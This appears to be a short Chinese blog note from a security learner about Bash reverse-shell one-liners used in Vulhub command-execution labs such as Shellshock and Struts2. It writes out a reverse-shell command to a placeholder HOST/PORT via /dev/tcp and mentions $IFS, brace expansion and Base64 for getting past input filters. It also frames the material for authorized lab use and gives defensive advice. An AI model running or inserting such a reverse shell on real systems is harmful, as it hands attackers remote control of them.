ailx10说：这篇是我2024年10月写的。那段时间我刷了不少 Vulhub 命令执行实验，发现都是 Bash 回连，换个漏洞入口，写法却未必能直接照搬。Shellshock、Struts2 的几个题里，我先后碰到了重定向、空格过滤、IFS 和 Base64 这些细节，于是把用过的写法集中记在一处，省得下次又翻一圈旧文。这篇更像我做实验时攒下来的备忘录：看着像同一条命令，放进不同的 Shell、参数和转义层里，结果可能就变了，还是得回到当时的环境核对。

---

原文整理了若干历史漏洞实验中使用的 Bash 反向连接写法。这些命令是后续命令执行阶段的示例，不是相应漏洞的完整触发过程。实验仅应在明确授权的隔离环境中进行。

一个结构示意如下，`HOST` 与 `PORT` 应替换为实验网络中受控监听端的信息：

```bash
bash -i >& /dev/tcp/HOST/PORT 0>&1
```

`bash -i` 启动交互式 Bash；Bash 的 `/dev/tcp/host/port` 特殊路径用于尝试建立 TCP 连接；重定向将标准输出、错误输出和标准输入关联到该连接。是否能运行取决于目标环境的 Bash、网络出站策略以及命令所在上下文。

原文还使用了 `$IFS`、大括号展开和 Base64 等形式。它们可能用于适配某些输入限制或编码层，但必须分别考虑外层解析、引号、转义和目标 shell。某次写法在一个实验中有效，不代表它对所有同名漏洞或其他 shell 都有效；Base64 也不是加密。

防守角度应及时修复命令执行漏洞，限制服务权限与出站连接，并结合进程、网络和应用日志调查异常。

一条命令能否成立，最后仍取决于解释器和输入经过的处理。把这些条件一起留下，比只保存一行看似精巧的命令，更容易在下一次排错时找到方向。
